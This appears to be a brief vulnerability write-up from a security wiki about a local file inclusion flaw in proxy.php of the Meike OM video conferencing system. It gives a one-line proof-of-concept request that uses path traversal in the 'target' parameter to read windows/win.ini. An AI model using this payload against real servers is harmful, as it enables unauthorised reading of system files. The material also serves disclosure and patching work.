# Meike OM video conferencing system proxy.php file contains vulnerabilities

## Vulnerability Description

The proxy.php file target parameter of Meike OM video conferencing system has a local file containing vulnerability. 

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Meike OM video conferencing system</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1630909738237-5162ec96-62e1-4c6b-85ed-f68afa1ffb59.png)

Verify POC

```python
/admin/do/proxy.php?method=get&target=../../../../../../../../../../windows/win.ini
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1630910015996-7abd7e35-7bb3-4fdc-b0b9-e203546a0de2.png)